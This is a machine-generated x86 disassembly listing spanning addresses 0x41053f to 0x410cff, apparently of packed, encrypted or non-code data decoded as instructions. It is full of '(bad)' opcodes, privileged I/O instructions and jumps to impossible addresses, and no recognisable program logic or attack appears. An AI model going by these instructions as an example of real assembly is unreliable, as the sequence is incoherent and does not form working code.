  41053f:	(bad)  
  410540:	std    
  410541:	call   0x4019a6
  410546:	test   DWORD PTR [ecx+0xe],0xf5d55dff
  41054d:	jmp    DWORD PTR [edi-0xff78c3d]
  410553:	(bad)  
  410555:	call   DWORD PTR [edi-0x600f4c3d]
  41055b:	ret    
  41055c:	std    
  41055d:	call   0x401966
  410562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410563:	mov    edx,ebp
  410565:	div    DWORD PTR [edi+0x7751e6c3]
  41056b:	(bad)  
  41056c:	std    
  41056d:	dec    DWORD PTR [ebp-0x33]
  410570:	out    0x4,eax
  410572:	pop    es
  410573:	(bad)  
  410574:	std    
  410575:	jmp    FWORD PTR [ebp-0x3f]
  410578:	out    0x6d,al
  41057a:	xor    eax,DWORD PTR ds:0x3100ff00
  410580:	popf   
  410581:	pop    ebx
  410582:	div    BYTE PTR [esi-0x36]
  410585:	pop    ebx
  410586:	xor    eax,0xc844c31e
  41058b:	jae    0x4105b8
  41058d:	add    dl,BYTE PTR [ebp-0x56]
  410590:	ret    
  410591:	add    bl,0x55
  410594:	inc    ebp
  410595:	add    ch,BYTE PTR [edx-0x16]
  410598:	loop   0x410568
  41059a:	pop    es
  41059b:	pop    ecx
  41059c:	inc    edi
  41059d:	push   ss
  41059e:	(bad)  
  41059f:	ds test al,0xbe
  4105a2:	sti    
  4105a3:	ss xchg esp,eax
  4105a5:	cli    
  4105a6:	adc    BYTE PTR [bx-0x3f],bl
  4105ab:	daa    
  4105ac:	jle    0x4105de
  4105ae:	inc    edi
  4105af:	jo     0x4105d3
  4105b1:	pop    edx
  4105b2:	lea    edx,[edi]
  4105b4:	sub    BYTE PTR [ebx-0x2],al
  4105b7:	test   BYTE PTR [edx],bh
  4105b9:	(bad)  
  4105bb:	xchg   ebp,eax
  4105bc:	loope  0x4105c1
  4105be:	push   0x80022233
  4105c3:	or     edi,eax
  4105c5:	inc    ebp
  4105c6:	(bad)  
  4105c7:	out    dx,al
  4105c8:	fiadd  DWORD PTR [ebx]
  4105ca:	add    dh,dl
  4105cc:	mov    eax,0xe14c20da
  4105d1:	add    ebp,DWORD PTR [eax+0x7]
  4105d4:	cmc    
  4105d5:	ret    0xcfff
  4105d8:	adc    eax,0xca27e7fc
  4105dd:	inc    esp
  4105de:	(bad)  
  4105df:	mov    esi,0xfe4815
  4105e4:	cmp    al,0x2a
  4105e6:	pop    edx
  4105e7:	push   ebx
  4105e8:	pop    ebp
  4105e9:	pop    DWORD PTR [ebx-0x38]
  4105ec:	jae    0x41061c
  4105ee:	add    dl,BYTE PTR [ebp-0x56]
  4105f1:	mov    es,WORD PTR [ecx+0x43bfd9c3]
  4105f7:	(bad)  
  4105f8:	mov    esp,0xf647ac09
  4105fd:	aaa    
  4105fe:	shl    edi,cl
  410600:	jg     0x4105c0
  410602:	loopne 0x41065f
  410604:	mov    dl,BYTE PTR [ebx]
  410606:	jmp    0xf58a400e
  41060b:	jle    0x41065c
  41060d:	or     ebp,ecx
  41060f:	add    esi,DWORD PTR [esi-0x32]
  410612:	xor    BYTE PTR [ebx],al
  410614:	xor    DWORD PTR [ecx],ecx
  410616:	jmp    0x257dfb57
  41061b:	cld    
  41061c:	inc    esi
  41061d:	cmp    BYTE PTR [edx-0x7cf734fd],dl
  410623:	add    ecx,ebx
  410625:	or     BYTE PTR [esi+edi*4+0x22],bl
  410629:	fnstenv [ebx+0x7e]
  41062c:	and    al,BYTE PTR [eax-0x3]
  41062f:	inc    ebx
  410630:	outs   dx,BYTE PTR ds:[esi]
  410631:	cmp    BYTE PTR [ebx+0x4b],bh
  410634:	pop    ss
  410635:	mov    esi,0x12cc5aec
  41063a:	jmp    0x548a4042
  41063f:	or     DWORD PTR [eax],ecx
  410641:	arpl   dx,bp
  410643:	add    esi,DWORD PTR [ecx]
  410645:	mov    eax,ds:0x7100cc7e
  41064a:	or     esi,eax
  41064c:	mov    ecx,0xf5ed213a
  410651:	fbstp  TBYTE PTR [edi]
  410653:	popa   
  410654:	push   esp
  410655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410656:	lea    esi,[ebx+edi*1-0x29c7c831]
  41065d:	into   
  41065e:	(bad)  
  410660:	inc    edx
  410661:	mov    edi,0xbf346b81
  410666:	aaa    
  410667:	lea    ebp,[esi-0x4ecc5052]
  41066d:	icebp  
  41066e:	or     BYTE PTR [esi+0x79],bh
  410671:	mov    ?,WORD PTR [edi]
  410673:	push   DWORD PTR [ebp-0xe]
  410676:	ss je  0x41065a
  410679:	pop    edx
  41067a:	(bad)  
  41067b:	xor    BYTE PTR [esi-0xe],ah
  41067e:	add    BYTE PTR [ebp+ecx*2-0x3c01c8c6],0x32
  410686:	mov    eax,ds:0x3775bc59
  41068b:	std    
  41068c:	jl     0x4106ab
  41068e:	aas    
  41068f:	(bad)  
  410690:	ds repnz mov esp,0xf86e4107
  410697:	(bad)  
  410698:	cs mov esp,0xf21ee78c
  41069e:	ss imul ebp,ecx,0xa86cac8a
  4106a5:	xor    bh,BYTE PTR [eax]
  4106a7:	mov    ah,0x19
  4106a9:	push   0x37
  4106ab:	inc    BYTE PTR [esi]
  4106ad:	add    al,ch
  4106af:	push   cs
  4106b0:	call   0xfe792c86
  4106b5:	pusha  
  4106b6:	test   al,0x2a
  4106b8:	imul   dh
  4106ba:	jae    0x410641
  4106bc:	test   ch,al
  4106be:	dec    ebx
  4106bf:	aaa    
  4106c0:	(bad)  
  4106c1:	cmp    ebp,ecx
  4106c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106c4:	ins    BYTE PTR es:[edi],dx
  4106c5:	sub    BYTE PTR ds:0x2bd9b436,ch
  4106cb:	aaa    
  4106cc:	inc    dh
  4106ce:	test   eax,0xe5f1e80e
  4106d3:	aaa    
  4106d4:	(bad)  
  4106d5:	pusha  
  4106d6:	test   eax,0x73aef656
  4106db:	mov    al,ds:0xa58a10ff
  4106e0:	inc    eax
  4106e1:	jmp    0x9f308459
  4106e6:	jae    0x41071f
  4106e8:	(bad)  
  4106e9:	adc    al,0x3d
  4106eb:	and    esp,ebp
  4106ed:	add    al,ch
  4106ef:	retf   
  4106f0:	std    
  4106f1:	mov    DWORD PTR ds:0x1ffff5d2,edx
  4106f7:	cdq    
  4106f8:	adc    eax,0x7
  4106fb:	retf   
  4106fc:	std    
  4106fd:	push   eax
  4106fe:	pusha  
  4106ff:	mov    WORD PTR [ebx+0x41],gs
  410702:	mov    bl,cl
  410704:	mov    bl,0xf0
  410706:	xlat   BYTE PTR ds:[ebx]
  410707:	retf   0xfffd
  41070a:	test   DWORD PTR [edx],eax
  41070c:	call   0xfe0c6fde
  410711:	mov    DWORD PTR [eax],eax
  410713:	aad    0xdd
  410715:	cmc    
  410716:	call   FWORD PTR [edi]
  410718:	fs (bad) 
  41071a:	addr16 out dx,al
  41071c:	js     0x41075d
  41071e:	add    BYTE PTR [edi],cl
  410720:	mov    cl,0xee
  410722:	neg    DWORD PTR [edi]
  410724:	retf   
  410725:	std    
  410726:	jne    0x410778
  410728:	loop   0x4106da
  41072a:	xor    BYTE PTR [edi],bh
  41072c:	retf   
  41072d:	xchg   DWORD PTR [ebp-0x20ca4],eax
  410733:	lea    eax,[ecx-0x37e0083e]
  410739:	dec    esi
  41073a:	push   0x3f7961
  41073f:	movsx  ebp,dh
  410742:	neg    edi
  410744:	(bad)  
  410745:	std    
  410746:	jne    0x410758
  410748:	loop   0x4106da
  41074a:	xor    bh,bh
  41074c:	mov    DWORD PTR [edi-0x2105f7b],0x680d82ff
  410756:	mov    ds:0xfefe4a6d,al
  41075b:	inc    ebp
  41075c:	std    
  41075d:	cmc    
  41075e:	dec    DWORD PTR [edi-0x5ff78c39]
  410764:	outs   dx,DWORD PTR ds:[esi]
  410765:	push   DWORD PTR cs:[ecx]
  410768:	lahf   
  410769:	mov    al,BYTE PTR [ecx+esi*2-0x4b01bf62]
  410770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410771:	jnp    0x410769
  410773:	sahf   
  410774:	mov    dh,0xd3
  410776:	addr16 add bh,al
  410779:	or     al,0xc3
  41077b:	dec    DWORD PTR [edi-0x7909cc04]
  410781:	scas   al,BYTE PTR es:[edi]
  410782:	inc    eax
  410783:	je     0x4107ae
  410785:	fcomp  st(0)
  410787:	das    
  410788:	jbe    0x410768
  41078a:	mov    al,BYTE PTR [ebp+ebp*4-0x4d01bf22]
  410791:	mov    WORD PTR [edi],gs
  410793:	neg    BYTE PTR [esi-0xa]
  410796:	add    ecx,DWORD PTR [edi]
  410798:	lods   eax,DWORD PTR ds:[esi]
  410799:	out    0x3,al
  41079b:	add    BYTE PTR [ecx],dh
  41079d:	mov    ds:0xee3ecf7e,eax
  4107a2:	inc    eax
  4107a3:	inc    ebp
  4107a5:	and    al,0x83
  4107a7:	mov    esp,0xfe411679
  4107ac:	xor    DWORD PTR [ebx-0x7a],edx
  4107af:	mov    al,0x31
  4107b1:	and    al,BYTE PTR [edx]
  4107b3:	push   0xbd2f2231
  4107b8:	push   ss
  4107b9:	mov    dh,0x12
  4107bb:	call   0xfe80518b
  4107c0:	push   es
  4107c1:	xchg   esi,eax
  4107c2:	cs idiv dh
  4107c5:	push   ebx
  4107c6:	aas    
  4107c7:	je     0x4107ea
  4107c9:	dec    edx
  4107ca:	adc    BYTE PTR [edx],ch
  4107cc:	out    dx,al
  4107cd:	inc    ebx
  4107ce:	aas    
  4107cf:	mov    ah,0xd9
  4107d1:	jae    0x410812
  4107d3:	(bad)  
  4107d4:	fdivp  st(5),st
  4107d6:	adc    ebp,eax
  4107d8:	xor    DWORD PTR [eax],ecx
  4107da:	inc    ecx
  4107db:	inc    BYTE PTR [eax]
  4107dd:	into   
  4107de:	mov    ebp,0x9c6f626
  4107e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107e4:	inc    eax
  4107e5:	inc    ebp
  4107e6:	sbb    DWORD PTR [ecx-0x6acbf6cb],edx
  4107ec:	inc    eax
  4107ed:	in     eax,0x55
  4107ef:	xchg   ebp,eax
  4107f0:	inc    eax
  4107f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107f2:	xor    al,0x3b
  4107f4:	and    esp,DWORD PTR [edi+0x1d407d34]
  4107fa:	sbb    DWORD PTR [ecx+0x6d345975],eax
  410800:	inc    eax
  410801:	mov    ebp,0x7f405d51
  410806:	xor    al,0xd3
  410808:	adc    ecx,DWORD PTR [ecx+0x6f40ff59]
  41080e:	xor    al,0x93
  410810:	push   ebx
  410811:	pop    edi
  410812:	xor    al,0x45
  410814:	inc    eax
  410815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410816:	pop    ebp
  410817:	xor    eax,0xbb345740
  41081c:	adc    ebx,DWORD PTR [ecx-0x67]
  41081f:	inc    DWORD PTR [eax+0x47]
  410822:	xor    al,0x5b
  410824:	dec    edi
  410825:	inc    edi
  410826:	xor    al,0x1d
  410828:	inc    eax
  410829:	mov    ebp,0x59710118
  41082e:	xor    al,0xd
  410830:	inc    eax
  410831:	fisttp QWORD PTR [ebp+edi*8+0x3f]
  410835:	pop    ds
  410836:	xor    al,0x33
  410838:	dec    ebx
  410839:	pop    ds
  41083a:	xor    al,0xf5
  41083c:	aas    
  41083d:	test   DWORD PTR [ecx],ebx
  41083f:	add    DWORD PTR [ecx-0x1acba700],esi
  410845:	aas    
  410846:	lds    ecx,FWORD PTR [eax-0x2b]
  410849:	aas    
  41084a:	div    DWORD PTR [ebx]
  41084c:	pop    ebx
  41084d:	adc    al,0xd9
  41084f:	test   bh,bh
  410851:	ds out 0x33,eax
  410854:	jnp    0x4108d2
  410856:	out    0x33,eax
  410858:	mov    ebp,0xff749d3f
  41085d:	mov    ebp,0x34fe330e
  410862:	sbb    eax,0xffd04b21
  410867:	xor    bh,dh
  410869:	adc    al,0x1d
  41086b:	xor    al,0xb4
  41086d:	cdq    
  41086e:	xor    di,si
  410871:	mov    gs,eax
  410873:	or     ebp,eax
  410875:	imul   esi,eax,0x32
  410878:	(bad)  
  410879:	jle    0x410893
  41087b:	and    al,0xf6
  41087d:	jbe    0x4108cd
  41087f:	sub    al,0x48
  410881:	mov    ebp,0x9cfe3347
  410886:	inc    ecx
  410887:	cmp    edi,esi
  410889:	pop    esi
  41088a:	inc    ebp
  41088b:	imul   BYTE PTR [ebx]
  41088d:	push   esi
  41088e:	xor    esi,DWORD PTR cs:[ecx+eax*2+0x51fe331e]
  410896:	(bad)  
  410897:	(bad)  
  410899:	ds push ss
  41089b:	jge    0x410880
  41089d:	ds push cs
  41089f:	xor    esp,edi
  4108a1:	add    DWORD PTR [ecx+0x32],eax
  4108a4:	(bad)  
  4108a5:	add    BYTE PTR es:[eax-0x9e109ad],bh
  4108ac:	sub    ebx,DWORD PTR [eax*8+0x54fe336f]
  4108b3:	test   DWORD PTR [ebx],edi
  4108b5:	inc    BYTE PTR [esi]
  4108b7:	dec    ebp
  4108b8:	sbb    BYTE PTR [esi+edi*8],ch
  4108bb:	push   edi
  4108bc:	xor    esi,DWORD PTR [ebp+ebx*1+0x1fe3346]
  4108c3:	cs in  eax,0xfe
  4108c6:	out    0x3f,al
  4108c8:	jge    0x410895
  4108ca:	(bad)  
  4108cb:	aaa    
  4108cc:	xor    esp,edi
  4108ce:	aad    0xdb
  4108d0:	xor    edi,esi
  4108d2:	into   
  4108d3:	imul   ecx,DWORD PTR [edx-0xa],0xe6f3f700
  4108da:	icebp  
  4108db:	inc    ebx
  4108dc:	repnz std 
  4108de:	dec    DWORD PTR [ebp-0x3a]
  4108e1:	cmc    
  4108e2:	call   DWORD PTR [edi-0x68d41b22]
  4108e8:	repz std 
  4108ea:	mov    ch,0x54
  4108ec:	sti    
  4108ed:	std    
  4108ee:	push   DWORD PTR [eax-0x4800d631]
  4108f4:	repz inc ebx
  4108f6:	clc    
  4108f7:	rcr    DWORD PTR [esi],0xfb
  4108fa:	call   DWORD PTR [edi]
  4108fc:	repz jae 0x4108fb
  4108ff:	mov    al,0xfb
  410901:	adc    eax,0xc0c59800
  410906:	or     al,0x88
  410908:	push   ecx
  410909:	mov    esp,ebp
  41090b:	add    BYTE PTR [ebx],cl
  41090d:	retf   0x6afa
  410910:	pop    eax
  410911:	pusha  
  410912:	pop    edx
  410913:	(bad)  
  410914:	jge    0x410914
  410916:	out    0xed,eax
  410918:	inc    eax
  410919:	repnz std 
  41091b:	mov    DWORD PTR [ebp+0x5075fdf2],ecx
  410921:	pop    esi
  410922:	ss ins DWORD PTR es:[edi],dx
  410924:	cdq    
  410925:	push   es
  410926:	push   DWORD PTR ds:0x3f3dfa
  41092c:	and    cl,bl
  41092e:	cli    
  41092f:	inc    DWORD PTR [edi-0xd]
  410932:	jae    0x41093c
  410934:	mov    al,0x2d
  410936:	imul   eax,DWORD PTR [ecx+0x8],0x5e
  41093a:	add    BYTE PTR [eax],al
  41093c:	or     BYTE PTR [esi-0xbfb441a],al
  410942:	std    
  410943:	(bad)  
  410944:	jge    0x410938
  410946:	std    
  410947:	jne    0x410949
  410949:	fdivp  st(6),st
  41094b:	sub    bh,dl
  41094d:	repz mov edx,0x55022431
  410954:	mov    edx,0xddc38073
  410959:	xlat   BYTE PTR ds:[ebx]
  41095a:	add    eax,DWORD PTR [eax]
  41095c:	(bad)  
  41095d:	mov    cl,0xab
  41095f:	mov    edx,0xff03e15c
  410964:	cmp    al,0x54
  410966:	cmp    esi,DWORD PTR [ecx+ebp*1-0x68]
  41096a:	(bad)  
  41096b:	push   ebx
  41096c:	mov    dh,0x92
  41096e:	stos   DWORD PTR es:[edi],eax
  41096f:	add    BYTE PTR [eax],al
  410971:	xor    DWORD PTR [ebx+0x346e677d],ecx
  410977:	sar    edi,0x9f
  41097a:	xor    al,0xe
  41097c:	call   FWORD PTR [eax+edi*1]
  41097f:	sub    bh,BYTE PTR [edi]
  410981:	in     eax,0xba
  410983:	cmp    al,0xfe
  410985:	cld    
  410986:	push   ebx
  410987:	sub    ah,BYTE PTR [ebp+0xa3cab41]
  41098d:	jno    0x4109ea
  41098f:	cmc    
  410990:	mov    ah,dh
  410992:	fld    TBYTE PTR [ebx+0x7df266ff]
  410998:	addr16 call 0x3e7c:0x57ffc15c
  4109a0:	inc    ah
  4109a2:	daa    
  4109a3:	sub    bl,BYTE PTR [ebx]
  4109a5:	fucom  st(2)
  4109a7:	cmp    al,0x67
  4109a9:	xor    BYTE PTR [eax],ah
  4109ab:	sub    edi,DWORD PTR [ebp+0x40aeeac9]
  4109b1:	xor    DWORD PTR [edi],edx
  4109b3:	mov    bh,0xfb
  4109b5:	es xchg esi,eax
  4109b7:	or     ch,al
  4109b9:	mov    ?,WORD PTR ss:[ebx]
  4109bc:	(bad)  
  4109bd:	push   ss
  4109be:	mov    dh,0x3e
  4109c0:	out    0x3c,eax
  4109c2:	dec    ebx
  4109c3:	cmp    edi,esi
  4109c5:	clc    
  4109c6:	in     al,0xb
  4109c8:	add    BYTE PTR [ecx+ecx*1+0x72],ah
  4109cc:	das    
  4109cd:	mov    bl,0x45
  4109cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109d0:	test   eax,0xadf6a8ee
  4109d5:	add    BYTE PTR [ecx+0x9],dh
  4109d8:	inc    ecx
  4109d9:	es dec ebp
  4109db:	retf   0x3ce8
  4109de:	pop    ebp
  4109df:	std    
  4109e0:	rol    BYTE PTR [edi+ebx*1],1
  4109e3:	xor    BYTE PTR [ebp-0x294a0ef8],dh
  4109e9:	mov    dh,BYTE PTR [ebp+0x2d]
  4109ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ed:	mov    dh,0xba
  4109ef:	xor    BYTE PTR [ebx],dl
  4109f1:	or     al,0x99
  4109f3:	rcl    BYTE PTR [ebp+0x1330a73c],1
  4109f9:	inc    eax
  4109fa:	xchg   esi,eax
  4109fb:	push   esi
  4109fc:	sar    BYTE PTR [edi+edx*4],cl
  4109ff:	mov    ds:0x9f5eabe8,eax
  410a04:	daa    
  410a05:	add    al,0x19
  410a07:	daa    
  410a08:	sti    
  410a09:	ret    0x2f7e
  410a0c:	fisttp DWORD PTR [edi]
  410a0e:	mov    DWORD PTR [edx+0xb],edx
  410a11:	cmp    eax,0xb729046f
  410a16:	cmp    al,0x82
  410a18:	mov    ds:0x44b65f3f,eax
  410a1d:	cmp    al,0xdd
  410a1f:	add    BYTE PTR [ecx-0xe],dl
  410a22:	dec    edi
  410a23:	xor    BYTE PTR ds:0x402cbd3c,dh
  410a29:	or     BYTE PTR fs:[eax],dh
  410a2c:	and    eax,0xa7a836a9
  410a31:	lods   eax,DWORD PTR ds:[esi]
  410a32:	jno    0x410a3d
  410a34:	cmp    DWORD PTR [edi],0x3ce8ca95
  410a3a:	add    BYTE PTR [ebp+0x456810fd],ah
  410a40:	xor    ch,bh
  410a42:	pop    es
  410a43:	icebp  
  410a44:	mov    ah,0xff
  410a46:	fidivr WORD PTR [ebx-0x3b11043c]
  410a4c:	xor    edi,esi
  410a4e:	pop    esp
  410a4f:	and    eax,0x2ade0221
  410a54:	das    
  410a55:	(bad)  
  410a56:	pop    esp
  410a57:	sub    DWORD PTR [eax],ebp
  410a59:	js     0x410a5e
  410a5b:	sbb    ch,BYTE PTR [edi]
  410a5d:	mov    WORD PTR [ecx+eiz*1],gs
  410a60:	shl    BYTE PTR [edi+0x2],0x9b
  410a64:	enter  0x40ff,0x9
  410a68:	popf   
  410a69:	inc    eax
  410a6a:	jmp    0x914cbf6a
  410a6f:	jbe    0x410a4d
  410a71:	(bad)  
  410a72:	sahf   
  410a73:	ds dec ecx
  410a75:	jae    0x410a87
  410a77:	mov    ah,0xc4
  410a79:	imul   DWORD PTR [edx-0x28]
  410a7c:	cmp    eax,DWORD PTR [ebx]
  410a7e:	cld    
  410a7f:	retf   0x4482
  410a82:	cmp    DWORD PTR [esi-0x6c26c4d1],0x31f7fe2f
  410a8c:	jno    0x410a9d
  410a8e:	push   cs
  410a8f:	sub    eax,0x22a48909
  410a94:	and    ecx,DWORD PTR [ebx+0x56]
  410a97:	mov    al,ds:0x88a0671f
  410a9c:	enter  0x73ff,0x0
  410aa0:	jo     0x410ae9
  410aa2:	dec    edi
  410aa3:	push   ecx
  410aa4:	jl     0x410abb
  410aa6:	add    cl,ch
  410aa8:	scas   eax,DWORD PTR es:[edi]
  410aa9:	dec    ebx
  410aaa:	or     ebx,DWORD PTR [eax+esi*2+0x4b]
  410aae:	dec    edi
  410aaf:	je     0x410b21
  410ab1:	inc    edi
  410ab2:	dec    edi
  410ab3:	xchg   ecx,eax
  410ab4:	popfw  
  410ab6:	inc    eax
  410ab7:	jmp    0x14cc027
  410abc:	or     bl,dh
  410abe:	inc    BYTE PTR [eax]
  410ac0:	das    
  410ac1:	(bad)  
  410ac2:	mov    edi,0x437dec74
  410ac7:	cld    
  410ac8:	fwait
  410ac9:	jo     0x410a8d
  410acb:	add    eax,DWORD PTR [esi+0xc75feff]
  410ad1:	hlt    
  410ad2:	jae    0x410adc
  410ad4:	add    BYTE PTR [esi-0xc000004],al
  410ada:	jae    0x410ad8
  410adc:	lock sti 
  410ade:	daa    
  410adf:	(bad)  
  410ae0:	out    dx,eax
  410ae1:	repz dec ebx
  410ae3:	lock pop ebx
  410ae5:	jno    0x410ad5
  410ae7:	add    BYTE PTR ds:0x8075fda3,al
  410aed:	loop   0x410ad3
  410aef:	sub    DWORD PTR [edi-0x5f3d380d],ecx
  410af5:	or     dl,BYTE PTR [ebp-0x75]
  410af8:	lods   al,BYTE PTR ds:[esi]
  410af9:	xchg   edx,eax
  410afb:	cld    
  410afc:	xor    al,BYTE PTR ds:0x79af5d6a
  410b02:	push   es
  410b03:	call   0xfd6c8b08
  410b08:	call   DWORD PTR [ecx]
  410b0a:	dec    ecx
  410b0b:	cli    
  410b0c:	push   0xbeef0a88
  410b11:	pusha  
  410b12:	scas   eax,DWORD PTR es:[edi]
  410b13:	imul   eax,DWORD PTR [ecx+0x58],0x62
  410b17:	shr    DWORD PTR [ebp-0x67],1
  410b1a:	or     bh,bh
  410b1c:	jne    0x410b6e
  410b1e:	loop   0x410b11
  410b20:	push   edx
  410b21:	out    dx,eax
  410b22:	repnz add WORD PTR [eax-0x1d],bx
  410b27:	mov    esp,0x3f611768
  410b2c:	add    BYTE PTR [eax-0x29],dh
  410b2f:	imul   eax,DWORD PTR [ecx+0x48],0xfffffff3
  410b33:	jae    0x410b3d
  410b35:	inc    eax
  410b36:	(bad)  
  410b37:	push   eax
  410b38:	push   DWORD PTR [ecx]
  410b3a:	pop    ss
  410b3b:	stos   DWORD PTR es:[edi],eax
  410b3c:	call   FWORD PTR [esi]
  410b3e:	das    
  410b3f:	ja     0x410ba8
  410b41:	ficom  DWORD PTR [ebx+eax*8-0x57f36901]
  410b48:	inc    eax
  410b49:	xor    DWORD PTR [edi],esi
  410b4b:	scas   al,BYTE PTR es:[edi]
  410b4c:	pop    es
  410b4d:	or     ebp,esp
  410b4f:	aam    0xfe
  410b51:	not    bh
  410b53:	add    al,BYTE PTR [eax]
  410b55:	fimul  WORD PTR [ebp-0x1eab3955]
  410b5b:	add    ebp,DWORD PTR [eax-0x3]
  410b5e:	in     al,dx
  410b5f:	ret    0xd7ff
  410b62:	in     al,dx
  410b63:	or     ebp,eax
  410b65:	lahf   
  410b66:	adc    DWORD PTR [ecx],edi
  410b68:	inc    BYTE PTR [eax]
  410b6a:	(bad)  
  410b6b:	sub    al,0x54
  410b6d:	inc    edi
  410b6e:	jo     0x410b90
  410b70:	aaa    
  410b71:	je     0x410b9c
  410b73:	cwde   
  410b74:	(bad)  
  410b76:	scas   al,BYTE PTR es:[edi]
  410b77:	mov    gs,WORD PTR [ebx-0x7ddfceff]
  410b7d:	(bad)  
  410b7e:	and    al,0x28
  410b80:	sub    cl,BYTE PTR [edi+edx*4-0x7a]
  410b84:	cmp    dh,bh
  410b86:	add    al,0xac
  410b88:	cmp    BYTE PTR [ecx+edi*1-0x78],dh
  410b8c:	dec    edx
  410b8d:	and    eax,0xc14a9e7e
  410b92:	sub    eax,0x5d8acd20
  410b97:	mov    ds:0x4c66fb3f,al
  410b9c:	push   cs
  410b9d:	jmp    esp
  410b9f:	das    
  410ba0:	sub    dl,BYTE PTR [edi+0xa38c718]
  410ba6:	jno    0x410c1b
  410ba8:	icebp  
  410ba9:	mov    ah,ch
  410bab:	repz cmp BYTE PTR [ecx+ebx*1-0x21],dh
  410bb0:	scas   al,BYTE PTR es:[edi]
  410bb1:	pop    es
  410bb2:	dec    ecx
  410bb3:	or     BYTE PTR [edi+ebx*8],bh
  410bb6:	das    
  410bb7:	sub    eax,0x2c3aaf1d
  410bbc:	fwait
  410bbd:	or     ecx,DWORD PTR [ecx]
  410bbf:	faddp  st(6),st
  410bc1:	cmp    BYTE PTR [edi],dl
  410bc3:	sub    eax,0xb70f377b
  410bc8:	lock sub edx,DWORD PTR [ecx-0x1d]
  410bcc:	cmc    
  410bcd:	cmp    BYTE PTR [eax],al
  410bcf:	push   DWORD PTR [esi-0x1dd3d414]
  410bd5:	in     eax,0x38
  410bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd8:	or     ch,cl
  410bda:	add    esi,DWORD PTR [ecx]
  410bdc:	inc    edx
  410bdd:	stos   BYTE PTR es:[edi],al
  410bde:	rdtsc  
  410be0:	(bad)  
  410be1:	popa   
  410be2:	daa    
  410be3:	mov    bl,0x45
  410be5:	rcl    al,0x64
  410be8:	fcom   DWORD PTR [ecx]
  410bea:	pop    ebp
  410beb:	xchg   edx,ebx
  410bed:	inc    esi
  410bee:	ret    
  410bef:	mov    esi,0x6638237d
  410bf4:	aam    0xa5
  410bf6:	scas   al,BYTE PTR es:[edi]
  410bf7:	ds sub al,0x13
  410bfa:	or     BYTE PTR [ecx-0x60c73eca],bl
  410c00:	add    BYTE PTR [ecx+0x10d938af],ch
  410c06:	add    al,0x31
  410c08:	sbb    al,0x3e
  410c0a:	cmp    ch,bh
  410c0c:	sub    al,0x18
  410c0e:	sar    DWORD PTR [edi-0x4a],1
  410c11:	loopne 0x410c3e
  410c13:	imul   DWORD PTR [ebx]
  410c15:	cmp    BYTE PTR gs:[ebx],bh
  410c18:	push   ecx
  410c19:	push   eax
  410c1a:	js     0x410c2a
  410c1c:	sub    al,0x55
  410c1e:	aaa    
  410c1f:	and    ecx,DWORD PTR [ecx-0x71]
  410c22:	cmp    BYTE PTR [edi+0x2c],dl
  410c25:	inc    ebp
  410c26:	xor    eax,0xaee5f19c
  410c2b:	jb     0x410c99
  410c2d:	dec    esp
  410c2f:	mov    ecx,ecx
  410c31:	call   FWORD PTR [ebx+0x0]
  410c34:	ja     0x410c66
  410c36:	dec    edi
  410c37:	mov    esi,0x1e0fb569
  410c3c:	xlat   BYTE PTR ds:[ebx]
  410c3d:	jmp    edi
  410c3f:	pop    ebp
  410c40:	or     eax,0x72e2fe2b
  410c45:	mov    eax,0xc4bb992f
  410c4a:	not    DWORD PTR [ecx+0x37ef092d]
  410c50:	cmp    DWORD PTR [ebp-0x1b05fef9],esi
  410c56:	(bad)  
  410c57:	out    0xfe,al
  410c59:	sub    dh,BYTE PTR [ecx+esi*8+0x1a]
  410c5d:	cdq    
  410c5e:	and    al,0xd6
  410c60:	sub    esi,DWORD PTR es:[ebp+ecx*8+0x1e]
  410c65:	mov    ch,0xf7
  410c67:	mov    BYTE PTR [eax-0x2fe917fd],0x2a
  410c6e:	inc    cl
  410c70:	mov    ah,bl
  410c72:	(bad)  
  410c73:	scas   al,BYTE PTR es:[edi]
  410c74:	mov    dl,0x3e
  410c76:	add    BYTE PTR [ebp-0x6147945e],ah
  410c7c:	pop    esi
  410c7d:	sub    edi,esi
  410c7f:	fwait
  410c80:	pop    ss
  410c81:	hlt    
  410c82:	push   es
  410c83:	adc    al,0xf
  410c85:	imul   esi,DWORD PTR [ebx-0x74d48bea],0x24
  410c8c:	dec    ecx
  410c8d:	mov    esp,0xfbc07656
  410c92:	(bad)  
  410c93:	hlt    
  410c94:	and    DWORD PTR cs:[edx+edx*1+0x0],ebx
  410c99:	sub    ecx,DWORD PTR es:[edx]
  410c9c:	sub    DWORD PTR [ecx+0x25624fd1],esp
  410ca2:	xchg   DWORD PTR [ebp+ecx*2+0x2c],edi
  410ca6:	mov    bl,0x4b
  410ca8:	add    al,bl
  410caa:	xor    bh,bh
  410cac:	je     0x410d00
  410cae:	ins    DWORD PTR es:[edi],dx
  410caf:	std    
  410cb0:	dec    ebp
  410cb1:	add    al,0x5d
  410cb3:	(bad)  
  410cb4:	push   edi
  410cb6:	mov    dl,0xfd
  410cb8:	jne    0x410d0e
  410cba:	cmp    edx,DWORD PTR [ebp-0x1]
  410cbd:	mov    ebp,0x46d6e7fe
  410cc2:	repnz std 
  410cc4:	or     esp,DWORD PTR [eax-0x22]
  410cc7:	sub    eax,DWORD PTR [eax+0x287508f6]
  410ccd:	into   
  410cce:	repz dec ebx
  410cd0:	cld    
  410cd1:	mov    dl,0x6
  410cd3:	lea    eax,[ebp+0x4]
  410cd6:	push   edi
  410cd7:	push   esp
  410cd8:	call   0x3e6236
  410cdd:	jecxz  0x410ca5
  410cdf:	jb     0x410cf5
  410ce1:	jo     0x410cea
  410ce3:	add    bh,ch
  410ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ce6:	repz jae 0x410ce5
  410ce9:	cs cmp bh,ch
  410cec:	jne    0x410cae
  410cee:	fisub  WORD PTR [ebp+0x9f387fe]
  410cf4:	fdiv   st,st(0)
  410cf6:	or     esp,DWORD PTR [esi]
  410cf8:	call   edi
  410cfa:	repnz xor eax,eax
  410cfd:	add    BYTE PTR [ecx],dl
  410cff:	repz std 
